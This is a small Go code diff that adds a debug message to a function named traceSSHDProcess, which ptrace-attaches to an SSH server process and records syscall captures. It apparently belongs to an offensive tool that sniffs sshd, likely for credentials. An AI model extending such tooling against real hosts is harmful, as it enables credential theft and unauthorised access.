@@ -23,6 +23,9 @@ func traceSSHDProcess(ctx context.Context, serverUrl string, taskData map[string
 	}
 	defer syscall.PtraceDetach(pid)
 
+	if debug.Debug {
+		fmt.Printf("[*] Attached to ssh process with PID: %v\n", pid)
+	}
 	var wstatus syscall.WaitStatus
 	var inSyscall bool
 	var firstValidCapture string
